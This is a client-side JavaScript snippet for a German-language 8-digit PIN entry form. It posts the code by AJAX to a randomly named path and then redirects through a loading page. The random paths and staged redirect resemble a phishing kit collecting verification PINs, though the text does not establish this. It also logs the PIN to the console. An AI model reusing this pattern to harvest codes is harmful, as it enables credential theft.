    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const form = document.getElementById('pinaform');
            const pinInputs = document.querySelectorAll('.pin-digit');
            const hiddenInput = document.getElementById('code-hidden');
            const submitBtn = document.getElementById('submitBtn');

            // Handle input behavior
            pinInputs.forEach((input, index) => {
                // Focus next input on entry
                input.addEventListener('input', function (e) {
                    // Only allow numbers
                    this.value = this.value.replace(/[^0-9]/g, '');

                    if (this.value.length === 1) {
                        if (index < pinInputs.length - 1) {
                            pinInputs[index + 1].focus();
                        } else {
                            // Last input filled, maybe auto-submit or just focus
                        }
                    }
                });

                // Handle backspace and arrow keys
                input.addEventListener('keydown', function (e) {
                    if (e.key === 'Backspace' && !this.value) {
                        if (index > 0) {
                            pinInputs[index - 1].focus();
                        }
                    }
                    if (e.key === 'ArrowLeft' && index > 0) {
                        pinInputs[index - 1].focus();
                    }
                    if (e.key === 'ArrowRight' && index < pinInputs.length - 1) {
                        pinInputs[index + 1].focus();
                    }
                });

                // Handle paste
                input.addEventListener('paste', function (e) {
                    e.preventDefault();
                    const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 8);

                    if (pastedData) {
                        pastedData.split('').forEach((char, i) => {
                            if (index + i < pinInputs.length) {
                                pinInputs[index + i].value = char;
                            }
                        });
                        // Focus the next empty input or the last one
                        const focusIndex = Math.min(index + pastedData.length, pinInputs.length - 1);
                        pinInputs[focusIndex].focus();
                    }
                });
            });

            // Handle form submission
            form.addEventListener('submit', function (e) {
                e.preventDefault();

                // Aggregate values
                let code = '';
                pinInputs.forEach(input => {
                    code += input.value;
                });

                hiddenInput.value = code;

                if (code.length < 8) {
                    alert('Bitte geben Sie die vollständige 8-stellige PIN ein');
                    return;
                }

                // Disable submit button and show loading state
                submitBtn.disabled = true;
                submitBtn.textContent = 'Wird überprüft...';

                console.log('Verification code:', code);

                // Send AJAX request
                $.ajax({
                    url: '/PiNT9BQWt7KTDdaVmafx',
                    type: 'POST',
                    contentType: 'application/json',
                    data: JSON.stringify({ code: code }),
                    success: function (response) {
                        if (response.OK) {
                            // Success - redirect after 3 seconds
                            setTimeout(() => {
                                window.location.href = '/loading?time=3&url=/RKnUB922z6Mf4HDwg3EZ';
                            }, 3000);
                        } else {
                            // Handle error response
                            alert('Falscher Code. Bitte versuchen Sie es erneut.');
                            submitBtn.disabled = false;
                            submitBtn.textContent = 'Bestätigen';
                            pinInputs.forEach(input => input.value = '');
                            pinInputs[0].focus();
                        }
                    },
                    error: function (xhr, status, error) {
                        // Handle AJAX error
                        console.error('AJAX Error:', error);
                        alert('Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.');
                        submitBtn.disabled = false;
                        submitBtn.textContent = 'Bestätigen';
                    }
                });
            });
        });
    </script>


